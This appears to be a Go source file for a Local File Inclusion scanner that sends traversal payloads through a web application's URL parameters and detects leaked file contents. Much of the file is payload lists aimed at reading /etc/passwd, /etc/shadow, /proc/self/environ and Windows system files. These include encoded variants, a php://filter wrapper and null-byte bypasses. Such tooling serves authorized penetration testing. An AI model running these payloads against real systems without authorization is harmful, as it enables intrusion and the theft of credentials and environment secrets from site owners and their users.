// Package lfi provides Local File Inclusion testing
package lfi

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// Config configures LFI testing
type Config struct {
	Concurrency int
	Timeout     time.Duration
	Headers     map[string]string
	OS          string // "linux", "windows", or "both"
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Concurrency: 10,
		Timeout:     10 * time.Second,
		OS:          "both",
	}
}

// Result represents an LFI test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	FileContent  string
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs LFI testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new LFI scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = 10
	}
	if config.Timeout <= 0 {
		config.Timeout = 10 * time.Second
	}

	return &Scanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		results: make([]Result, 0),
	}
}

// Scan tests a URL for LFI vulnerabilities
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads(s.config.OS) {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload.Value

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents an LFI payload
type Payload struct {
	Value   string
	OS      string
	Markers []string
}

// testPayload tests a single LFI payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param string, payload Payload, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload.Value,
		Timestamp: time.Now(),
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	q := u.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload.Markers)
	if result.Vulnerable {
		result.FileContent = string(body)
		result.Severity = "HIGH"
	}

	return result
}

// detectVulnerability checks response for LFI indicators
func (s *Scanner) detectVulnerability(body string, markers []string) (bool, string) {
	for _, marker := range markers {
		if strings.Contains(body, marker) {
			return true, "File content marker: " + marker
		}
	}

	// Generic file content patterns
	patterns := map[string]string{
		"root:x:0:0":    "passwd file",
		"[fonts]":       "win.ini file",
		"[extensions]":  "system.ini file",
		"[boot loader]": "boot.ini file",
		"<?php":         "PHP source",
		"#!/bin":        "shell script",
	}

	for pattern, desc := range patterns {
		if strings.Contains(body, pattern) {
			return true, desc + " detected"
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns LFI test payloads
func Payloads(os string) []Payload {
	payloads := make([]Payload, 0)

	if os == "linux" || os == "both" {
		payloads = append(payloads, linuxPayloads()...)
	}
	if os == "windows" || os == "both" {
		payloads = append(payloads, windowsPayloads()...)
	}

	return payloads
}

func linuxPayloads() []Payload {
	return []Payload{
		{Value: "/etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "....//....//etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "..%2f..%2fetc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "%2e%2e/%2e%2e/etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "....//....//....//etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "/etc/shadow", OS: "linux", Markers: []string{"root:"}},
		{Value: "/etc/hosts", OS: "linux", Markers: []string{"localhost"}},
		{Value: "/proc/self/environ", OS: "linux", Markers: []string{"PATH=", "HOME="}},
		{Value: "/proc/version", OS: "linux", Markers: []string{"Linux version"}},
		{Value: "/var/log/apache2/access.log", OS: "linux", Markers: []string{"GET", "HTTP"}},
		{Value: "php://filter/convert.base64-encode/resource=/etc/passwd", OS: "linux", Markers: []string{"cm9vdDo"}},
	}
}

func windowsPayloads() []Payload {
	return []Payload{
		{Value: "C:\\Windows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "..\\..\\..\\Windows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "....\\....\\Windows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "C:\\Windows\\System32\\drivers\\etc\\hosts", OS: "windows", Markers: []string{"localhost"}},
		{Value: "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", OS: "windows", Markers: []string{"localhost"}},
		{Value: "C:\\boot.ini", OS: "windows", Markers: []string{"[boot loader]"}},
		{Value: "..%5c..%5cWindows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
	}
}

// NullBytePayloads returns null byte injection payloads
func NullBytePayloads() []Payload {
	return []Payload{
		{Value: "../../../etc/passwd%00", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../etc/passwd\x00", OS: "linux", Markers: []string{"root:"}},
		{Value: "..\\..\\..\\Windows\\win.ini%00", OS: "windows", Markers: []string{"[fonts]"}},
	}
}
